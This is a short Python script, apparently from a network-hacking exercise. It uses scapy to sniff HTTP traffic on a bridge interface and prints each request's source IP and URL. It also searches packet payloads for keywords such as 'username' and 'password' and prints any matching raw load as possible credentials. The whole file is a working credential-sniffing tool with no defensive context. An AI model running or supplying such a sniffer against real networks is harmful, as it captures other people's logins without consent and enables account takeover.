import scapy.all as scapy
from scapy_http import http


def sniff(interface):
    # store = whether or not packets are stored
    # prn = callback func
    scapy.sniff(
            iface=interface,
            store=False,
            prn=process_sniffed_packet
            )


def get_url(packet):
    host = packet[http.HTTPRequest].Host or ""
    path = packet[http.HTTPRequest].Path or ""
    return host+path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "usr", "login", "password", "fname", "lname", "uname", "pass"]
        for kw in keywords:
            if kw in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        src = packet.getlayer(scapy.IP).src
        print("[+] HTTP Request >> " + str(src)+ str(url))
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " +
                  login_info +
                  "\n\n")


sniff("br-88eafd47121c")
